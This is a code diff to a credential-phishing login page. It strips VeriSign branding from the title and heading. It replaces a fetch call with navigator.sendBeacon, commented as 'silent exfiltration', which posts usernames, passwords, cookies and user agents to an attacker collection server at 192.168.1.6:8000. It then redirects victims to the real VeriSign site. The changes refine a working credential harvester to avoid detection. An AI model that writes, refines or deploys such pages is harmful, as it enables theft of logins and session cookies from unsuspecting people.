@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>VeriSign Secure Login</title>
+  <title>Secure Login</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -38,7 +38,7 @@
 
 <body>
   <div class="login-box">
-    <h1>VeriSign</h1>
+    <h1>Account Login</h1>
 
     <form onsubmit="sendCreds(event)">
       <input id="user" placeholder="Username or Email" required>
@@ -51,22 +51,21 @@
     function sendCreds(e) {
       e.preventDefault();
 
-      // Send credentials to attacker server
-      fetch("http://192.168.1.6:8000/collect", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          username: document.getElementById("user").value,
-          password: document.getElementById("pass").value,
-          cookies: document.cookie,
-          userAgent: navigator.userAgent
-        })
-      }).catch(() => {});
+      const data = JSON.stringify({
+        username: document.getElementById("user").value,
+        password: document.getElementById("pass").value,
+        cookies: document.cookie,
+        userAgent: navigator.userAgent
+      });
 
-      // Silent redirect to legitimate site
-      setTimeout(() => {
-        window.location.href = "https://www.verisign.com/";
-      }, 1500);
+      // Silent exfiltration – no warnings, no preflight
+      navigator.sendBeacon(
+        "http://192.168.1.6:8000/collect",
+        data
+      );
+
+      // Clean redirect
+      window.location.href = "https://www.verisign.com/";
     }
   </script>
 </body>
